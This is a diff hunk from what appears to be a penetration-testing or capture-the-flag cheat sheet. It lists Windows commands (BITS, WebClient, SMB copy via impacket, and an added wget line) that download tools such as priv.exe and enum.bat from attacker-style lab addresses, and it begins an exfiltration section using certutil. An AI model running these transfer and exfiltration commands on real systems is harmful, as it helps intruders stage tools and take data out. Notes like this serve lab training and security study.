@@ -77,7 +77,7 @@ Start-BitsTransfer -Source http://10.10.14.12/priv.exe -Destination 1.exe # PS
 $client = New-Object System.Net.WebClient  # two steps is better
 $client.DownloadFile('http://10.10.14.12/priv.exe', '1.exe')
 xcopy \\10.10.14.7\files\taskkill.exe  # from smb file server created with impacket
-
+wget -o enum.bat http://10.10.14.73/enum.bat
 
 EXFIL FILES CMD/PS
 certutil -encode PATH DESTINATION
